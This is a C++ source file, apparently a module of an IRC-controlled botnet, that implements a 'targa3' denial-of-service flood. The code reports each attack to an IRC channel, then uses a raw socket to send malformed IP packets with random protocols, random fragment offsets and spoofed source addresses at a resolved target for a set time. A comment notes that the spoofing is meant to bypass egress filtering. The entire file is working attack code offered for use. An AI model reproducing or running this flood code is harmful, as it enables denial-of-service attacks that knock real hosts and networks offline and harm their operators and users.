#include "main.h"
#include "mainctrl.h"

void Targa3(unsigned long TargetIP, int time);

CDDOSTarga3::CDDOSTarga3() { 
	m_szType = "CDDOSTarga3"; 
	m_sDDOSName.Assign("targa3"); 
}

void CDDOSTarga3::StartDDOS()
{	
	CDNS cDNS; 

	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: flooding %s for %u seconds", m_sDDOSName.CStr(), m_sHost.CStr(), m_iTime);
	Targa3(cDNS.ResolveAddress(m_sHost.Str()), m_iTime);
}

void Targa3(unsigned long TargetIP, int time)
{
#ifdef _WIN32
  sockaddr_in sin;
  unsigned long start;
  SOCKET sock;
  struct iph ip;
  char *packet;
  BOOL flag = TRUE;
  int packet_size = 512;
  int proto[14] = {	0, 1, 2, 4, 6, 8, 12, 17, 22, 41, 58, 255, 0 };
  int frags[10] = { 0, 0, 0, 8192, 0x4, 0x6, 16383, 1, 0 };
  struct hostent *he;
  int ret;
  char *addr;
  char *host = new char[256];

  gethostname(host, 256);
  he = gethostbyname (host);
  DWORD spoof = *(PDWORD)he->h_addr_list[0]; 
  sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag));
  packet = (char*)malloc(packet_size);
  start = GetTickCount();
  sin.sin_addr.s_addr = TargetIP;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(666);
  while (((GetTickCount() - start)/1000) <= time)
  {
    //spoof from an IP on our own class C subnet to bypass egress filtering routers..
	spoof &= 0x00FFFFFF; 
	spoof |= (rand() % 0xFF) << 24; 
	proto[13] = rand() % 255;
	frags[9] = rand() % 8100;
	ip.ihl = 5;
	ip.version = 4;
	ip.tos = 4;
	ip.id = rand();
	ip.frag_off = htons(frags[rand() % 10]);
	ip.tot_len = htons(packet_size);
	ip.ttl = 255;
	ip.protocol = proto[rand() % 14];
	ip.saddr = spoof;
	ip.daddr = TargetIP;
	ip.check = checksum((unsigned short*)&ip, sizeof(struct iph));
	memcpy(packet, &ip, sizeof(ip));
	sendto(sock, (const char*)packet, packet_size, 0, (struct sockaddr *)&sin, sizeof(sin));
  }
  free(packet);
  closesocket(sock);
  return;
#endif // _WIN32
}
